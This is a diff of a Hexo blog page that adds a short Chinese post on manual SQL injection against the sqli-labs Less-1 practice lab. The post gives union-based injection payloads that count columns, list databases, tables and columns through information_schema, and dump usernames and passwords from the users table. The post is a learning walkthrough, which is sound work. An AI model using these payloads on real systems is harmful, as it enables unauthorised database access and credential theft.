@@ -71,6 +71,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql手写注入基本语法与sqli-labs less1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/sql%E6%89%8B%E5%86%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8Esqli-labs%20less1/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.551Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/sql%E6%89%8B%E5%86%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8Esqli-labs%20less1/">sql手写注入基本语法与sqli-labs less1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>SQL注入的基本原理和常用语法<br>通过引号的闭合完成get类型的注入<br>或者用payload注释掉后面的语句<br>详细看这个链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/160352.html">https://www.freebuf.com/articles/web/160352.html</a><br>less 1 的详细<br>判断有没有注入点<br>判断注入点的闭合方式 通过看页面的回显<br>判断字段数，通过 order by函数，payload：？id&#x3D;1’ order by 3–+超过的话会报错，运用数学的二分法<br>将语句闭合并且 and 0<br>select1,2,database()–+查询当前数据库<br>union select 1,2,group_concat(schema_name) from information_schema.schema–+通过该语句查询所有的数据库<br>这里用了group_concat()函数和调用了 information_schema库<br>还可以通过payload：union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+查询数据库<br>?id&#x3D;1’ and 0衔接union select 1，2，group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+通过该语句查询security数据库当中的所有表<br>接下来是通过明锐的嗅觉构建payload：?id&#x3D;1’ and 0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+通过该语句查询表中的列<br>接下来是查看这个列中的字段值了，payload：id&#x3D;1’ and 0 union select 1,2,group_concat(id,username,passwprd) from users–+ </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/sql%E6%89%8B%E5%86%99%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8Esqli-labs%20less1/" data-id="cl22vvyyo000gl4vj3ek54c6c" data-title="sql手写注入基本语法与sqli-labs less1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-python盲注脚本" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/04/17/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="article-date">
@@ -392,51 +431,11 @@
 
 
   
-    <article id="post-newspaper" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/09/27/newspaper/" class="article-date">
-  <time class="dt-published" datetime="2021-09-27T11:43:45.000Z" itemprop="datePublished">2021-09-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/09/27/newspaper/">newspaper</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <hr>
-<p>Ploblemes have done.</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/27/newspaper/" data-id="cl22vvyym000dl4vj2duh3jim" data-title="newspaper" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -468,6 +467,10 @@
       <ul>
         
           <li>
+            <a href="/2022/04/30/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a>
+          </li>
+        
+          <li>
             <a href="/2022/04/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">(no title)</a>
           </li>
         
@@ -481,10 +484,6 @@
         
           <li>
             <a href="/2022/04/17/LESS%2032~37/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/04/17/less%2029~31/">(no title)</a>
           </li>
         
       </ul>
